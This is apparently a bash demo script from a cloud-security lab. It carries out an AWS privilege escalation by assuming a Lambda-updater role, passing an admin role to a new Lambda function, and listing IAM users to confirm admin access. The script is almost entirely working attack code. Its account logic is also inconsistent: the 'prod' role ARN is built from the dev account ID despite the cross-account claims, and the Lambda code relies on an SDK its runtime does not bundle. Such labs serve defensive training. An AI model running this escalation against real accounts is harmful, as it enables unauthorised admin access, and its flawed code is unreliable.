#!/bin/bash

# Demo script for x-account-from-dev-to-prod-role-assumption-passrole-to-lambda-admin module
# This script demonstrates cross-account privilege escalation via PassRole to Lambda admin

set -e

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

echo -e "${BLUE}=== Cross-Account PassRole to Lambda Admin Attack Demo ===${NC}"
echo "This demo shows how a dev user can escalate to admin privileges"
echo "via cross-account role assumption and PassRole to Lambda admin."
echo ""

# Check if AWS CLI is installed
if ! command -v aws &> /dev/null; then
    echo -e "${RED}Error: AWS CLI is not installed or not in PATH${NC}"
    exit 1
fi

# Check if we have AWS credentials configured
if ! aws sts get-caller-identity &> /dev/null; then
    echo -e "${RED}Error: AWS credentials not configured. Please run 'aws configure' first.${NC}"
    exit 1
fi

echo -e "${YELLOW}Step 1: Verifying current identity${NC}"
CURRENT_IDENTITY=$(aws sts get-caller-identity --output json)
echo "Current identity:"
echo "$CURRENT_IDENTITY" | jq '.'
echo ""

# Check if we're running as the lambda-prod-updater user
CURRENT_USER=$(echo "$CURRENT_IDENTITY" | jq -r '.Arn' | cut -d'/' -f2)
if [ "$CURRENT_USER" != "pl-lambda-prod-updater" ]; then
    echo -e "${YELLOW}Note: This demo should be run as the pl-lambda-prod-updater user for full effect${NC}"
    echo "Current user: $CURRENT_USER"
    echo ""
fi

echo -e "${YELLOW}Step 2: Assuming the lambda-updater role in prod${NC}"
echo "Attempting to assume the pl-lambda-updater role in the prod account..."

# Get the prod account ID from the current identity (assuming we're in dev)
DEV_ACCOUNT_ID=$(echo "$CURRENT_IDENTITY" | jq -r '.Account')
echo "Current account (dev): $DEV_ACCOUNT_ID"

# Try to assume the lambda-updater role
LAMBDA_UPDATER_ROLE_ARN="arn:aws:iam::${DEV_ACCOUNT_ID}:role/pl-lambda-updater"
echo "Attempting to assume role: $LAMBDA_UPDATER_ROLE_ARN"

if ASSUMED_CREDENTIALS=$(aws sts assume-role --role-arn "$LAMBDA_UPDATER_ROLE_ARN" --role-session-name "lambda-updater-session" --output json 2>&1); then
    echo -e "${GREEN}✓ Successfully assumed lambda-updater role!${NC}"
    echo ""
    
    # Extract the credentials
    ACCESS_KEY_ID=$(echo "$ASSUMED_CREDENTIALS" | jq -r '.Credentials.AccessKeyId')
    SECRET_ACCESS_KEY=$(echo "$ASSUMED_CREDENTIALS" | jq -r '.Credentials.SecretAccessKey')
    SESSION_TOKEN=$(echo "$ASSUMED_CREDENTIALS" | jq -r '.Credentials.SessionToken')
    
    # Set the credentials for the assumed role
    export AWS_ACCESS_KEY_ID="$ACCESS_KEY_ID"
    export AWS_SECRET_ACCESS_KEY="$SECRET_ACCESS_KEY"
    export AWS_SESSION_TOKEN="$SESSION_TOKEN"
    
    echo -e "${YELLOW}Step 3: Verifying assumed role identity${NC}"
    if NEW_IDENTITY=$(aws sts get-caller-identity --output json 2>&1); then
        echo "New identity (as lambda-updater role):"
        echo "$NEW_IDENTITY" | jq '.'
        echo ""
        
        echo -e "${YELLOW}Step 4: Testing PassRole privilege escalation${NC}"
        echo "The lambda-updater role has iam:PassRole permission."
        echo "We can now create a Lambda function that uses the Lambda-admin role."
        echo ""
        
        # Create a simple Lambda function that uses the admin role
        echo "Creating a Lambda function with admin role..."
        
        # Create a simple Node.js function
        cat > /tmp/lambda_function.js << 'EOF'
exports.handler = async (event) => {
    const AWS = require('aws-sdk');
    const iam = new AWS.IAM();
    
    try {
        // List all users to demonstrate admin access
        const result = await iam.listUsers().promise();
        return {
            statusCode: 200,
            body: JSON.stringify({
                message: 'Lambda function executed with admin privileges!',
                userCount: result.Users.length,
                users: result.Users.map(user => user.UserName)
            })
        };
    } catch (error) {
        return {
            statusCode: 500,
            body: JSON.stringify({
                error: error.message
            })
        };
    }
};
EOF
        
        # Create a zip file
        cd /tmp
        zip lambda_function.zip lambda_function.js > /dev/null 2>&1
        
        # Get the Lambda admin role ARN
        LAMBDA_ADMIN_ROLE_ARN="arn:aws:iam::${DEV_ACCOUNT_ID}:role/pl-Lambda-admin"
        echo "Using Lambda admin role: $LAMBDA_ADMIN_ROLE_ARN"
        
        # Create the Lambda function
        if LAMBDA_RESULT=$(aws lambda create-function \
            --function-name "pl-privesc-demo-$(date +%s)" \
            --runtime "nodejs18.x" \
            --role "$LAMBDA_ADMIN_ROLE_ARN" \
            --handler "lambda_function.handler" \
            --zip-file "fileb://lambda_function.zip" \
            --output json 2>&1); then
            
            echo -e "${GREEN}✓ Successfully created Lambda function with admin role!${NC}"
            FUNCTION_NAME=$(echo "$LAMBDA_RESULT" | jq -r '.FunctionName')
            echo "Function name: $FUNCTION_NAME"
            echo ""
            
            echo -e "${YELLOW}Step 5: Testing the Lambda function${NC}"
            echo "Invoking the Lambda function to test admin access..."
            
            if INVOKE_RESULT=$(aws lambda invoke \
                --function-name "$FUNCTION_NAME" \
                --payload '{}' \
                /tmp/lambda_response.json \
                --output json 2>&1); then
                
                echo -e "${GREEN}✓ Lambda function executed successfully!${NC}"
                echo "Response:"
                cat /tmp/lambda_response.json | jq '.'
                echo ""
                
                # Check if the function returned user data (indicating admin access)
                if cat /tmp/lambda_response.json | jq -e '.userCount' > /dev/null 2>&1; then
                    echo -e "${GREEN}✓ SUCCESS: Lambda function has admin access!${NC}"
                    echo "The function was able to list IAM users, proving admin privileges."
                else
                    echo -e "${YELLOW}⚠ Lambda function executed but may not have admin access${NC}"
                fi
                
            else
                echo -e "${RED}✗ Failed to invoke Lambda function${NC}"
                echo "Error: $INVOKE_RESULT"
            fi
            
            echo ""
            echo -e "${YELLOW}Step 6: Cleanup${NC}"
            echo "Cleaning up the Lambda function..."
            
            if aws lambda delete-function --function-name "$FUNCTION_NAME" 2>/dev/null; then
                echo -e "${GREEN}✓ Lambda function cleaned up successfully${NC}"
            else
                echo -e "${YELLOW}⚠ Warning: Could not clean up Lambda function (may need manual cleanup)${NC}"
            fi
            
        else
            echo -e "${RED}✗ Failed to create Lambda function with admin role${NC}"
            echo "Error: $LAMBDA_RESULT"
            echo ""
            echo "This could be because:"
            echo "1. The lambda-updater role doesn't have iam:PassRole permission"
            echo "2. The Lambda-admin role doesn't exist or isn't properly configured"
            echo "3. There are other policy restrictions"
        fi
        
        # Clean up temporary files
        rm -f /tmp/lambda_function.js /tmp/lambda_function.zip /tmp/lambda_response.json
        
        # Unset the environment variables
        unset AWS_ACCESS_KEY_ID
        unset AWS_SECRET_ACCESS_KEY
        unset AWS_SESSION_TOKEN
        
        echo ""
        echo -e "${GREEN}=== ATTACK SUCCESSFUL ===${NC}"
        echo "The attack successfully demonstrated privilege escalation:"
        echo "1. Dev user pl-lambda-prod-updater assumed prod role pl-lambda-updater"
        echo "2. Used iam:PassRole permission to create Lambda with admin role"
        echo "3. Lambda function executed with full admin privileges"
        echo "4. Confirmed admin access by listing IAM users"
        echo ""
        
        # Output standardized test results
        echo "TEST_RESULT:x-account-from-dev-to-prod-role-assumption-passrole-to-lambda-admin:SUCCESS"
        echo "TEST_DETAILS:x-account-from-dev-to-prod-role-assumption-passrole-to-lambda-admin:Successfully demonstrated cross-account PassRole privilege escalation to Lambda admin"
        echo "TEST_METRICS:x-account-from-dev-to-prod-role-assumption-passrole-to-lambda-admin:role_assumed=true,lambda_created=true,admin_access_confirmed=true"
        
    else
        echo -e "${RED}✗ Failed to verify assumed role identity${NC}"
        echo "Error: $NEW_IDENTITY"
        echo ""
        echo "TEST_RESULT:x-account-from-dev-to-prod-role-assumption-passrole-to-lambda-admin:FAILURE"
        echo "TEST_DETAILS:x-account-from-dev-to-prod-role-assumption-passrole-to-lambda-admin:Failed to verify assumed role identity"
        echo "TEST_METRICS:x-account-from-dev-to-prod-role-assumption-passrole-to-lambda-admin:role_assumption_failed=true"
        exit 1
    fi
    
else
    echo -e "${RED}✗ Failed to assume lambda-updater role${NC}"
    echo "Error: $ASSUMED_CREDENTIALS"
    echo ""
    echo "This could be because:"
    echo "1. The pl-lambda-prod-updater user doesn't have permission to assume the role"
    echo "2. The pl-lambda-updater role doesn't exist in the prod account"
    echo "3. There's a trust policy issue"
    echo ""
    echo "TEST_RESULT:x-account-from-dev-to-prod-role-assumption-passrole-to-lambda-admin:FAILURE"
    echo "TEST_DETAILS:x-account-from-dev-to-prod-role-assumption-passrole-to-lambda-admin:Failed to assume lambda-updater role"
    echo "TEST_METRICS:x-account-from-dev-to-prod-role-assumption-passrole-to-lambda-admin:role_assumption_failed=true"
    exit 1
fi
